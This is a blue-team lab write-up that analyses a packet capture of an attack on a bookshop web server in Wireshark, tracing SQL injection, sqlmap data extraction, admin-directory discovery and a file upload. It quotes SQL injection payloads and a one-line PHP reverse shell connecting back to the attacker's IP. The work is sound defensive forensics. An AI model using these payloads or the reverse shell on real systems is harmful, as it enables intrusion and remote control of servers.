# Wireshark Session 2: CyberDefenders Web Investigation Lab

**Tool:** Wireshark (plus CyberChef for decoding)

**Date:** 29/09/2026

**Lab:** [CyberDefenders: Web Investigation](https://cyberdefenders.org/blueteam-ctf-challenges/web-investigation/) (Network Forensics, Easy)

## Scope and Environment

This lab provides a packet capture (`WebInvestigation.pcap`) of an attack against an online bookshop web server. I analysed it inside a Windows 11 virtual machine running in VMware Workstation rather than on my main laptop, because the capture contains a malicious uploaded file. Keeping the analysis isolated is good practice when handling potentially harmful material.

## Summary

An attacker exploited a SQL injection vulnerability in the website's search function, used the automated tool sqlmap to extract data from the database, found a hidden admin area, logged in, and uploaded a PHP reverse shell to gain remote command line access to the server.

| Item | Detail |
|---|---|
| Attacker IP | `111.224.250.131` |
| Victim web server | `73.124.22.98` (bookworldstore.com, Apache 2.4.52 on Ubuntu) |
| Vulnerable script | `search.php` |
| Attacker tool identified | sqlmap 1.8.3 (from the User-Agent header) |
| Hidden directory found | `/admin/` |
| Malicious file uploaded | `NVri2vhp.php` (reverse shell to attacker on port 443) |

## What I Did

I worked through the capture as if investigating a real incident, building a timeline of the attacker's actions using Wireshark display filters.

**1. Finding the vulnerable script.** I filtered for SQL keywords in request URLs to separate attack traffic from normal browsing:

```
http.request.uri contains "SELECT"
```

Every malicious request targeted `search.php`, which makes sense as a search box passes user input directly into a database query.

**2. Finding the first injection attempt.** I filtered all requests to `search.php` and sorted by packet number. The attacker first tested manually:

* `search=book'` returned a **500 Internal Server Error**, suggesting the input was breaking the SQL query
* `search=book and 1=1; -- -` then `search=book and 1=2; -- -`, a boolean test to confirm the injected SQL was being executed
* `OR 1=1` variations to try to return all records

**3. Identifying automated tooling.** After the manual tests, requests started arriving several per second with complex payloads. Following an HTTP stream showed the User-Agent `sqlmap/1.8.3#stable`. I also recognised sqlmap signatures in the payloads:

* An initial request containing a mix of XSS, `xp_cmdshell` and `/etc/passwd` strings, which is sqlmap probing for a web application firewall
* `EXTRACTVALUE` payloads, an error based technique that leaks data inside database error messages
* Hex encoded marker strings such as `0x7178766271` (`qxvbq`) wrapped around extracted data so the tool can find it in the page

**4. Tracking data extraction.** I decoded the payloads with CyberChef's URL Decode recipe and followed the attacker as they enumerated the database. The database listing request queried MySQL's built in `INFORMATION_SCHEMA.SCHEMATA` table:

```
/search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

This was followed by a request to `INFORMATION_SCHEMA.TABLES` to list tables, which revealed the table holding website user data. To isolate this I combined filters:

```
http.request.uri matches "information_schema.tables" && frame.number > 1520
```

**5. Finding the hidden directory.** The attacker then brute forced directories on the server. Most guesses returned 404, so I filtered for redirects instead:

```
http.response.code == 301 || http.response.code == 302
```

This revealed the `/admin/` directory.

**6. Finding the uploaded file.** File uploads are sent as POST requests with multipart form data:

```
http.request.method == "POST" && mime_multipart
```

This showed a single upload to `/admin/index.php` containing `NVri2vhp.php`. Its contents were:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'");?>
```

## What I Found or Learned

**The attack followed a clear progression**, which maps to MITRE ATT&CK tactics:

1. **Initial Access:** manual SQL injection testing, then sqlmap automation against `search.php`
2. **Collection:** databases, tables and user data extracted via UNION based and error based injection
3. **Discovery:** directory brute forcing to find `/admin/`
4. **Persistence:** logging into the admin panel and uploading a malicious PHP file
5. **Command and Control:** a reverse shell making the server connect back to the attacker on port 443, a port normally used for HTTPS so the traffic blends in and is less likely to be blocked

**500 errors are not always a failed attack.** In error based injection, the attacker deliberately breaks the query so the database leaks data inside its error message.

**Attackers switch tools.** Requests during the injection phase came from sqlmap, but the admin upload came from a normal Firefox User-Agent, showing the attacker moved to manual browser activity once they had access.

**Useful Wireshark techniques I picked up:**

* `matches` is case insensitive, whereas `contains` is case sensitive, which matters because sqlmap mixes letter cases
* Responses compressed with gzip won't match raw text filters; `http.file_data` searches the decompressed body instead
* `http.response_for.uri` filters responses by the request they answered
* **Statistics > Protocol Hierarchy** and **Statistics > Conversations** give a quick overview before diving into packets
* Right clicking a header field and choosing **Apply as Column** makes comparing many packets much faster
* **Follow > HTTP Stream** shows the full request and response in readable form

**Remediation I would recommend** if this were a real incident: use parameterised queries in `search.php`, restrict access to `/admin/` (IP allowlisting or VPN only) and enforce strong unique passwords with MFA, validate file uploads by type and block execution in upload directories, reset all user credentials in the affected database, and alert on outbound connections from the web server to unfamiliar IPs.

## Notes for Later

* Check whether the reverse shell actually connected using `ip.addr == 111.224.250.131 && tcp.port == 443` and, if so, follow the stream to see what commands the attacker ran
* Learn to use sqlmap myself in a lab environment to better understand what its traffic looks like from the attacker's side
* Try NetworkMiner, which this lab also lists, for extracting files and credentials automatically
* Next lab ideas: more CyberDefenders network forensics labs, then Malware Traffic Analysis exercises inside the VM
